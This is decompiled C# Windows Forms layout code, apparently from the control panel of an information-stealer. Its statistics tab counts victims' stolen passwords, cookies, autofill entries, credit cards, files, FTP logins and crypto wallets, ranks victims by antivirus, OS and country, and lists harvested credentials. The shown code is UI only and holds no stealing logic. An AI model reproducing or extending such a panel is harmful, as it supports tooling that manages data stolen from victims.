        ((System.Windows.Forms.DataGridViewColumn)this.Comment).DataPropertyName = "Comment";
        ((System.Windows.Forms.DataGridViewColumn)this.Comment).FillWeight = 150f;
        ((System.Windows.Forms.DataGridViewColumn)this.Comment).HeaderText = "Comment";
        ((System.Windows.Forms.DataGridViewColumn)this.Comment).Name = "Comment";
        ((System.Windows.Forms.DataGridViewBand)this.Comment).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.Comment).Resizable = System.Windows.Forms.DataGridViewTriState.False;
        ((System.Windows.Forms.DataGridViewColumn)this.Comment).Width = 150;
        ((System.Windows.Forms.DataGridViewColumn)this.Creds).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        ((System.Windows.Forms.DataGridViewColumn)this.Creds).DataPropertyName = "Creds";
        ((System.Windows.Forms.DataGridViewColumn)this.Creds).HeaderText = "Creds";
        ((System.Windows.Forms.DataGridViewColumn)this.Creds).Name = "Creds";
        ((System.Windows.Forms.DataGridViewBand)this.Creds).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.Creds).Width = 61;
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).DataPropertyName = "PDD";
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).FillWeight = 200f;
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).HeaderText = "PDD";
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).Name = "pDDDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.pDDDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.pDDDataGridViewTextBoxColumn).Width = 54;
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).AutoSizeMode = System.Windows.Forms.DataGridViewAutoSizeColumnMode.AllCells;
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).DataPropertyName = "CDD";
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).FillWeight = 200f;
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).HeaderText = "CDD";
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).Name = "cDDDataGridViewTextBoxColumn";
        ((System.Windows.Forms.DataGridViewBand)this.cDDDataGridViewTextBoxColumn).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewColumn)this.cDDDataGridViewTextBoxColumn).Width = 55;
        ((System.Windows.Forms.DataGridViewColumn)this.Credentials).DataPropertyName = "Credentials";
        ((System.Windows.Forms.DataGridViewColumn)this.Credentials).HeaderText = "Credentials";
        ((System.Windows.Forms.DataGridViewColumn)this.Credentials).Name = "Credentials";
        ((System.Windows.Forms.DataGridViewBand)this.Credentials).ReadOnly = true;
        ((System.Windows.Forms.DataGridViewBand)this.Credentials).Visible = false;
        ((System.Windows.Forms.BindingSource)this.object_16).DataSource = typeof(Meta.SharedModels.UserLog);
        ((System.Windows.Forms.Control)this.statisticTab).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider20);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.activeConnections);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider6);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider7);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.e1);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider8);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.e4);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.e2);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.e3);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.resetStatsBtn);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.coldWalletLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.coldWalletCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10CountriesLb);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10countryLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10osLb);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.top10osLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.ftpLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.ftpsCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.filesLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.filesCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider5);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cardsLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.creditcardsCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider4);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.autofillsLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.autofillsCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider3);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cookiesLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.cookiesCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider2);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.passwordsLbl);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.passwordsCounter);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.metroSetDivider1);
        ((System.Windows.Forms.Control)this.statisticTab).Controls.Add((System.Windows.Forms.Control)this.label56);
        ((System.Windows.Forms.Control)this.statisticTab).Font = new System.Drawing.Font("Segoe UI", 9f);
        ((System.Windows.Forms.Control)this.statisticTab).ForeColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.TabPage)this.statisticTab).Location = new System.Drawing.Point(194, 4);
        ((System.Windows.Forms.Control)this.statisticTab).Name = "statisticTab";
        ((System.Windows.Forms.Control)this.statisticTab).Size = new System.Drawing.Size(1168, 639);
        ((System.Windows.Forms.TabPage)this.statisticTab).TabIndex = 3;
        ((System.Windows.Forms.Control)this.statisticTab).Text = "Statistic";
        ((System.Windows.Forms.Control)this.metroSetDivider20).Location = new System.Drawing.Point(-1, 61);
        ((System.Windows.Forms.Control)this.metroSetDivider20).Name = "metroSetDivider20";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider20).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider20).TabIndex = 41;
        ((System.Windows.Forms.Control)this.metroSetDivider20).Text = "metroSetDivider20";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider20).Thickness = 1;
        ((System.Windows.Forms.Control)this.activeConnections).AutoSize = true;
        ((System.Windows.Forms.Control)this.activeConnections).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.activeConnections).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.activeConnections).Location = new System.Drawing.Point(149, 38);
        ((System.Windows.Forms.Control)this.activeConnections).Name = "activeConnections";
        ((System.Windows.Forms.Control)this.activeConnections).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.activeConnections).TabIndex = 39;
        ((System.Windows.Forms.Control)this.activeConnections).Text = "0";
        ((System.Windows.Forms.Label)this.activeConnections).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.metroSetDivider6).Location = new System.Drawing.Point(-1, 481);
        ((System.Windows.Forms.Control)this.metroSetDivider6).Name = "metroSetDivider6";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider6).Size = new System.Drawing.Size(1169, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider6).TabIndex = 20;
        ((System.Windows.Forms.Control)this.metroSetDivider6).Text = "metroSetDivider6";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider6).Thickness = 1;
        ((System.Windows.Forms.Control)this.metroSetDivider7).Location = new System.Drawing.Point(214, 5);
        ((System.Windows.Forms.Control)this.metroSetDivider7).Name = "metroSetDivider7";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).Orientation = MetroSet_UI.Enums.DividerStyle.Vertical;
        ((System.Windows.Forms.Control)this.metroSetDivider7).Size = new System.Drawing.Size(4, 480);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider7).TabIndex = 23;
        ((System.Windows.Forms.Control)this.metroSetDivider7).Text = "metroSetDivider7";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider7).Thickness = 1;
        ((System.Windows.Forms.Control)this.e1).Location = new System.Drawing.Point(910, 5);
        ((System.Windows.Forms.Control)this.e1).Name = "metroSetDivider17";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).Orientation = MetroSet_UI.Enums.DividerStyle.Vertical;
        ((System.Windows.Forms.Control)this.e1).Size = new System.Drawing.Size(4, 480);
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).StyleManager = null;
        ((System.Windows.Forms.Control)this.e1).TabIndex = 37;
        ((System.Windows.Forms.Control)this.e1).Text = "metroSetDivider17";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e1).Thickness = 1;
        ((System.Windows.Forms.Control)this.metroSetDivider8).Location = new System.Drawing.Point(564, 5);
        ((System.Windows.Forms.Control)this.metroSetDivider8).Name = "metroSetDivider8";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).Orientation = MetroSet_UI.Enums.DividerStyle.Vertical;
        ((System.Windows.Forms.Control)this.metroSetDivider8).Size = new System.Drawing.Size(4, 480);
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).StyleManager = null;
        ((System.Windows.Forms.Control)this.metroSetDivider8).TabIndex = 26;
        ((System.Windows.Forms.Control)this.metroSetDivider8).Text = "metroSetDivider8";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider8).Thickness = 1;
        ((System.Windows.Forms.Control)this.e4).Location = new System.Drawing.Point(-1, 120);
        ((System.Windows.Forms.Control)this.e4).Name = "metroSetDivider18";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.e4).Size = new System.Drawing.Size(216, 4);
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).StyleManager = null;
        ((System.Windows.Forms.Control)this.e4).TabIndex = 38;
        ((System.Windows.Forms.Control)this.e4).Text = "metroSetDivider18";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetDivider)this.e4).Thickness = 1;
        ((System.Windows.Forms.Control)this.e2).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.e2).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.Control)this.e2).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.e2).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.e2).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.e2).ItemHeight = 14;
        ((System.Windows.Forms.ListBox)this.e2).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
        ((System.Windows.Forms.Control)this.e2).Location = new System.Drawing.Point(574, 74);
        ((System.Windows.Forms.Control)this.e2).Name = "top10AvsLb";
        ((System.Windows.Forms.ListBox)this.e2).SelectionMode = System.Windows.Forms.SelectionMode.None;
        ((System.Windows.Forms.Control)this.e2).Size = new System.Drawing.Size(330, 224);
        ((System.Windows.Forms.Control)this.e2).TabIndex = 36;
        ((System.Windows.Forms.Control)this.e3).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.e3).Location = new System.Drawing.Point(574, 43);
        ((System.Windows.Forms.Control)this.e3).Name = "metroSetLabel6";
        ((System.Windows.Forms.Control)this.e3).Size = new System.Drawing.Size(330, 23);
        ((MetroSet_UI.Controls.MetroSetLabel)this.e3).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.e3).StyleManager = null;
        ((System.Windows.Forms.Control)this.e3).TabIndex = 35;
        ((System.Windows.Forms.Control)this.e3).Text = "Top 10 of AV";
        ((System.Windows.Forms.Label)this.e3).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.e3).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.e3).ThemeName = "MetroDark";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).DisabledBackColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).DisabledBorderColor = System.Drawing.Color.FromArgb(120, 65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).DisabledForeColor = System.Drawing.Color.Gray;
        ((System.Windows.Forms.Control)this.resetStatsBtn).Font = new System.Drawing.Font("Microsoft Sans Serif", 10f);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).HoverBorderColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).HoverColor = System.Drawing.Color.FromArgb(95, 207, 255);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).HoverTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.resetStatsBtn).Location = new System.Drawing.Point(1045, 608);
        ((System.Windows.Forms.Control)this.resetStatsBtn).Name = "resetStatsBtn";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).NormalBorderColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).NormalColor = System.Drawing.Color.FromArgb(65, 177, 225);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).NormalTextColor = System.Drawing.Color.White;
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).PressBorderColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).PressColor = System.Drawing.Color.FromArgb(35, 147, 195);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).PressTextColor = System.Drawing.Color.White;
        ((System.Windows.Forms.Control)this.resetStatsBtn).Size = new System.Drawing.Size(115, 23);
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).Style = MetroSet_UI.Design.Style.Light;
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).StyleManager = null;
        ((System.Windows.Forms.Control)this.resetStatsBtn).TabIndex = 34;
        ((System.Windows.Forms.Control)this.resetStatsBtn).Text = "Reset all stats";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetButton)this.resetStatsBtn).ThemeName = "MetroLite";
        ((System.Windows.Forms.Control)this.resetStatsBtn).Click += new System.EventHandler(resetStatsBtn_Click);
        ((System.Windows.Forms.Control)this.coldWalletLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.coldWalletLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.coldWalletLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.coldWalletLbl).Location = new System.Drawing.Point(4, 98);
        ((System.Windows.Forms.Control)this.coldWalletLbl).Name = "coldWalletLbl";
        ((System.Windows.Forms.Control)this.coldWalletLbl).Size = new System.Drawing.Size(100, 21);
        ((System.Windows.Forms.Control)this.coldWalletLbl).TabIndex = 31;
        ((System.Windows.Forms.Control)this.coldWalletLbl).Text = "Cold Wallets:";
        ((System.Windows.Forms.Label)this.coldWalletLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.coldWalletCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.coldWalletCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.coldWalletCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.coldWalletCounter).Location = new System.Drawing.Point(103, 97);
        ((System.Windows.Forms.Control)this.coldWalletCounter).Name = "coldWalletCounter";
        ((System.Windows.Forms.Control)this.coldWalletCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.coldWalletCounter).TabIndex = 30;
        ((System.Windows.Forms.Control)this.coldWalletCounter).Text = "0";
        ((System.Windows.Forms.Label)this.coldWalletCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.top10CountriesLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.top10CountriesLb).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.Control)this.top10CountriesLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.top10CountriesLb).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.top10CountriesLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.top10CountriesLb).ItemHeight = 14;
        ((System.Windows.Forms.ListBox)this.top10CountriesLb).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
        ((System.Windows.Forms.Control)this.top10CountriesLb).Location = new System.Drawing.Point(917, 74);
        ((System.Windows.Forms.Control)this.top10CountriesLb).Name = "top10CountriesLb";
        ((System.Windows.Forms.ListBox)this.top10CountriesLb).SelectionMode = System.Windows.Forms.SelectionMode.None;
        ((System.Windows.Forms.Control)this.top10CountriesLb).Size = new System.Drawing.Size(248, 224);
        ((System.Windows.Forms.Control)this.top10CountriesLb).TabIndex = 28;
        ((System.Windows.Forms.Control)this.top10countryLbl).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.top10countryLbl).Location = new System.Drawing.Point(917, 43);
        ((System.Windows.Forms.Control)this.top10countryLbl).Name = "top10countryLbl";
        ((System.Windows.Forms.Control)this.top10countryLbl).Size = new System.Drawing.Size(248, 23);
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10countryLbl).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10countryLbl).StyleManager = null;
        ((System.Windows.Forms.Control)this.top10countryLbl).TabIndex = 27;
        ((System.Windows.Forms.Control)this.top10countryLbl).Text = "Top 10 of Country";
        ((System.Windows.Forms.Label)this.top10countryLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10countryLbl).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10countryLbl).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.top10osLb).BackColor = System.Drawing.Color.FromArgb(52, 56, 67);
        ((System.Windows.Forms.ListBox)this.top10osLb).BorderStyle = System.Windows.Forms.BorderStyle.None;
        ((System.Windows.Forms.Control)this.top10osLb).Cursor = System.Windows.Forms.Cursors.Default;
        ((System.Windows.Forms.Control)this.top10osLb).Font = new System.Drawing.Font("Consolas", 9f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.top10osLb).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.ListBox)this.top10osLb).HorizontalScrollbar = true;
        ((System.Windows.Forms.ListBox)this.top10osLb).ItemHeight = 14;
        ((System.Windows.Forms.ListBox)this.top10osLb).Items.AddRange(new object[10] { "1", "2", "3", "4", "5", "6", "7", "8", "9", "10" });
        ((System.Windows.Forms.Control)this.top10osLb).Location = new System.Drawing.Point(226, 74);
        ((System.Windows.Forms.Control)this.top10osLb).Name = "top10osLb";
        ((System.Windows.Forms.ListBox)this.top10osLb).SelectionMode = System.Windows.Forms.SelectionMode.None;
        ((System.Windows.Forms.Control)this.top10osLb).Size = new System.Drawing.Size(329, 224);
        ((System.Windows.Forms.Control)this.top10osLb).TabIndex = 25;
        ((System.Windows.Forms.Control)this.top10osLbl).Font = new System.Drawing.Font("Microsoft Sans Serif", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.top10osLbl).Location = new System.Drawing.Point(226, 43);
        ((System.Windows.Forms.Control)this.top10osLbl).Name = "top10osLbl";
        ((System.Windows.Forms.Control)this.top10osLbl).Size = new System.Drawing.Size(329, 23);
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10osLbl).Style = MetroSet_UI.Design.Style.Dark;
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10osLbl).StyleManager = null;
        ((System.Windows.Forms.Control)this.top10osLbl).TabIndex = 24;
        ((System.Windows.Forms.Control)this.top10osLbl).Text = "Top 10 of OS";
        ((System.Windows.Forms.Label)this.top10osLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10osLbl).ThemeAuthor = "Narwin";
        ((MetroSet_UI.Controls.MetroSetLabel)this.top10osLbl).ThemeName = "MetroDark";
        ((System.Windows.Forms.Control)this.ftpLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.ftpLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ftpLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.ftpLbl).Location = new System.Drawing.Point(4, 458);
        ((System.Windows.Forms.Control)this.ftpLbl).Name = "ftpLbl";
        ((System.Windows.Forms.Control)this.ftpLbl).Size = new System.Drawing.Size(38, 21);
        ((System.Windows.Forms.Control)this.ftpLbl).TabIndex = 22;
        ((System.Windows.Forms.Control)this.ftpLbl).Text = "FTP:";
        ((System.Windows.Forms.Label)this.ftpLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.ftpsCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.ftpsCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.ftpsCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.ftpsCounter).Location = new System.Drawing.Point(103, 457);
        ((System.Windows.Forms.Control)this.ftpsCounter).Name = "ftpsCounter";
        ((System.Windows.Forms.Control)this.ftpsCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.ftpsCounter).TabIndex = 21;
        ((System.Windows.Forms.Control)this.ftpsCounter).Text = "0";
        ((System.Windows.Forms.Label)this.ftpsCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.filesLbl).AutoSize = true;
        ((System.Windows.Forms.Control)this.filesLbl).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.filesLbl).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.filesLbl).Location = new System.Drawing.Point(4, 398);
        ((System.Windows.Forms.Control)this.filesLbl).Name = "filesLbl";
        ((System.Windows.Forms.Control)this.filesLbl).Size = new System.Drawing.Size(44, 21);
        ((System.Windows.Forms.Control)this.filesLbl).TabIndex = 19;
        ((System.Windows.Forms.Control)this.filesLbl).Text = "Files:";
        ((System.Windows.Forms.Label)this.filesLbl).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.filesCounter).AutoSize = true;
        ((System.Windows.Forms.Control)this.filesCounter).Font = new System.Drawing.Font("Segoe UI", 12f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 204);
        ((System.Windows.Forms.Control)this.filesCounter).ForeColor = System.Drawing.Color.FromArgb(200, 200, 200);
        ((System.Windows.Forms.Control)this.filesCounter).Location = new System.Drawing.Point(103, 397);
        ((System.Windows.Forms.Control)this.filesCounter).Name = "filesCounter";
        ((System.Windows.Forms.Control)this.filesCounter).Size = new System.Drawing.Size(19, 21);
        ((System.Windows.Forms.Control)this.filesCounter).TabIndex = 18;
        ((System.Windows.Forms.Control)this.filesCounter).Text = "0";
        ((System.Windows.Forms.Label)this.filesCounter).TextAlign = System.Drawing.ContentAlignment.MiddleCenter;
        ((System.Windows.Forms.Control)this.metroSetDivider5).Location = new System.Drawing.Point(-2, 420);
        ((System.Windows.Forms.Control)this.metroSetDivider5).Name = "metroSetDivider5";
        ((MetroSet_UI.Controls.MetroSetDivider)this.metroSetDivider5).Orientation = MetroSet_UI.Enums.DividerStyle.Horizontal;
        ((System.Windows.Forms.Control)this.metroSetDivider5).Size = new System.Drawing.Size(216, 4);
